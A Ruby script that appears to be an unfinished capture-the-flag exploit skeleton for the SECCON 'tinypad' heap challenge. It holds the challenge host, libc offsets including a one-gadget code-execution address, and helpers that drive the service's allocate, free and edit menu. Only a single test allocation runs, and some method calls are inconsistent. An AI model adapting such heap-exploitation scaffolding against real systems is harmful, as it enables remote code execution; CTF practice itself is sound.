#!/usr/bin/env ruby

require 'pwn'

remote = ARGV[0] == "r"

if remote 
	host = "tinypad.pwn.seccon.jp"
	port = 54321
	libc_offset = {
		"main_arena" => 0x3be760,
		"environ" => 0x5e9178,
		"one_gadget_rce" => 0xe66bd
	}
else
	host = "localhost"
	port = 54321
end

class MyTube < Sock
	def initialize(host, port)
		super(host, port)
	end
	def sendlineafter(pre, post)
		recvuntil(pre)
		sendline(post)
	end
	def recv_until_prompt
		recvuntil("(CMD)>>> ")
	end
end

def tube
	@tube
end

def alloc(size, content)
	tube.recv_until_prompt
	tube.sendline("A")
	tube.sendlineafter("(SIZE)>>> ", "#{size}")
	tube.sendlineafter("(CONTENT)>>> ", content)
end

def free(index)
	tube.recv_until_prompt
	tube.sendline("D")
	tube.sendlineafter("(INDEX)>>> ", "#{index}")
end

def edit_memo(index, content)
	tube.recv_until_prompt
	tube.sendline("E")
	tube.sendlineafter("(INDEX)>>> ", "#{index}")
	tube.sendlineafter("(CONTENT)>>> ", content)
	tube.recv_until("(Y/n)>>> ")
	tube.sendline("Y")
end

#z=MyTube.new "localhost", 54321
MyTube.new("localhost", 54321) do |z|
puts "Starting..."
@tube=z
pid=`pidof tinypad`.split.first
puts "[DEBUG] %s Continue?" % [pid]
gets
alloc(12,"A"*12)
data=z.recvuntil("(CMD)>>> ")
puts data

#z.sendlineafter("(CMD)>>> ", "A")
#z.sendlineafter("(SIZE)>>> ", "12")
#z.sendlineafter("(CONTENT)>>> ", "A"*12)
#
#
#puts "[DEBUG] %s Continue?" % [pid]
#gets
#
#data=z.recvuntil("(CMD)>>> ")
#puts data
end
